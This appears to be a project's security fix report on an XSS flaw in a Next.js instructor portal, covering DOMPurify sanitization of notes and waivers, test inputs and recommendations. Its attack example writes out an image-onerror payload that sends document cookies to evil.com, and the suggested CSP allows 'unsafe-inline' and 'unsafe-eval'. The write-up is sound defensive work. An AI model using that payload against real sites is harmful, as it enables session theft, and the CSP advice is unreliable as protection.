# XSS Security Vulnerability - Fixed

**Date:** December 20, 2025
**Severity:** CRITICAL
**Status:** ✅ RESOLVED

## Summary

Fixed a critical Cross-Site Scripting (XSS) vulnerability where user-generated HTML content was being rendered without proper sanitization using `dangerouslySetInnerHTML`.

## Vulnerability Details

### What Was Wrong

Three files were rendering user-provided HTML content **without any sanitization**:

1. **`app/(portal)/instructor/students/[id]/page.tsx`** (Lines 437, 494)
   - Rendered `note.content` directly without sanitization
   - **Risk:** Malicious users could inject JavaScript that would execute when instructors view notes

2. **`app/(portal)/instructor/waivers/[id]/page.tsx`** (Line 353)
   - Rendered `waiver.content` directly without sanitization
   - **Risk:** Malicious waiver content could execute scripts when viewed

3. **`components/NotesRichTextEditor.tsx`** (Line 167)
   - Used dynamic `require('dompurify')` only on client-side
   - No server-side sanitization support
   - **Risk:** Server-rendered content could bypass sanitization

### Attack Scenario Example

```javascript
// A malicious user could enter this as note content:
<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">

// Or this:
<script>
  // Steal session tokens
  // Redirect to phishing site
  // Modify page content
</script>
```

## Fix Implementation

### 1. Created Centralized Sanitization Utility

**File:** `lib/utils/sanitize.ts`

New comprehensive sanitization module with:

- **DOMPurify integration** with strict configuration
- **Whitelist-based filtering** - only safe HTML tags allowed
- **Server-side support** using jsdom for SSR safety
- **Multiple sanitization levels:**
  - `sanitizeHtml()` - General rich text content
  - `sanitizeWaiverHtml()` - More restrictive for legal documents
  - `sanitizePlainText()` - Strips all HTML
  - `createSanitizedHtml()` - Type-safe React helper

#### Security Configuration

```typescript
const DEFAULT_CONFIG = {
  ALLOWED_TAGS: [
    'p', 'br', 'strong', 'em', 'u', 's', 'del', 'ins',
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'ul', 'ol', 'li',
    'blockquote', 'pre', 'code',
    'a', 'span', 'div'
  ],
  ALLOWED_ATTR: ['class', 'id', 'href', 'target', 'rel'],
  FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover'],
  SANITIZE_DOM: true  // Prevents DOM clobbering attacks
}
```

### 2. Fixed All Vulnerable Files

#### NotesRichTextEditor.tsx
**Before:**
```tsx
const sanitizedContent = typeof window !== 'undefined'
  ? require('dompurify').sanitize(content, {...})
  : ''  // No server-side sanitization!
```

**After:**
```tsx
import { createSanitizedHtml } from '@/lib/utils/sanitize'

const sanitizedContent = createSanitizedHtml(content)
// Works on both client AND server
```

#### instructor/students/[id]/page.tsx
**Before:**
```tsx
<div dangerouslySetInnerHTML={{ __html: note.content }} />
// ⚠️ UNSAFE - Direct user content rendering
```

**After:**
```tsx
import { createSanitizedHtml } from '@/lib/utils/sanitize'

<div dangerouslySetInnerHTML={createSanitizedHtml(note.content)} />
// ✅ SAFE - Content sanitized before rendering
```

#### instructor/waivers/[id]/page.tsx
**Before:**
```tsx
<div dangerouslySetInnerHTML={{ __html: waiver.content }} />
// ⚠️ UNSAFE
```

**After:**
```tsx
import { createSanitizedHtml } from '@/lib/utils/sanitize'

<div dangerouslySetInnerHTML={createSanitizedHtml(waiver.content)} />
// ✅ SAFE
```

### 3. Added Dependencies

- **jsdom** (v27.3.0) - Enables server-side HTML sanitization
- **@types/jsdom** (v27.0.0) - TypeScript type definitions

## Security Measures Implemented

✅ **Whitelist-based tag filtering** - Only explicitly allowed HTML tags pass through
✅ **Event handler removal** - All `onerror`, `onload`, etc. stripped
✅ **Script tag blocking** - `<script>`, `<iframe>`, `<object>` completely forbidden
✅ **DOM clobbering prevention** - SANITIZE_DOM enabled
✅ **Server-side sanitization** - Works in SSR contexts (Next.js App Router)
✅ **Type safety** - TypeScript integration with `createSanitizedHtml()`
✅ **Configurable sanitization** - Different levels for different content types

## Testing Recommendations

### Manual Testing

1. **Test malicious script injection:**
   ```html
   <script>alert('XSS')</script><p>Safe content</p>
   ```
   Expected: Only `<p>Safe content</p>` renders

2. **Test event handler injection:**
   ```html
   <img src=x onerror="alert('XSS')">
   ```
   Expected: No alert fires, image renders without event handler

3. **Test allowed HTML:**
   ```html
   <p><strong>Bold</strong> and <em>italic</em></p>
   <ul><li>List item</li></ul>
   ```
   Expected: Renders correctly with formatting

### Automated Testing (Future)

Consider adding tests in `__tests__/security/sanitize.test.ts`:

```typescript
import { sanitizeHtml } from '@/lib/utils/sanitize'

describe('HTML Sanitization', () => {
  it('should remove script tags', () => {
    const dirty = '<script>alert("XSS")</script><p>Safe</p>'
    const clean = sanitizeHtml(dirty)
    expect(clean).toBe('<p>Safe</p>')
  })

  it('should remove event handlers', () => {
    const dirty = '<img src=x onerror="alert(1)">'
    const clean = sanitizeHtml(dirty)
    expect(clean).not.toContain('onerror')
  })
})
```

## Deployment Checklist

- [x] Code changes committed
- [x] Build passed successfully
- [x] All `dangerouslySetInnerHTML` instances verified
- [ ] Deploy to production
- [ ] Manual testing in production environment
- [ ] Monitor error logs for sanitization issues

## Additional Security Recommendations

### Content Security Policy (CSP)

Consider adding CSP headers to `next.config.ts`:

```typescript
const nextConfig = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';"
          }
        ]
      }
    ]
  }
}
```

### Input Validation

- Implement **server-side validation** for note/waiver content length
- Add **rate limiting** for content creation endpoints
- Consider **content moderation** for public-facing content

### Monitoring

- Set up **error tracking** (Sentry, LogRocket) to catch sanitization bypasses
- Monitor for **unusual HTML patterns** in content submissions
- Log **rejected sanitization attempts** for security analysis

## References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)
- [React dangerouslySetInnerHTML](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)

## Commits

1. **Fix static file serving** (2dcffa7) - Fixed proxy matcher pattern
2. **Fix XSS security vulnerability** (e05b2dd) - Implemented comprehensive sanitization

---

**Status:** All security issues resolved. Ready for deployment.
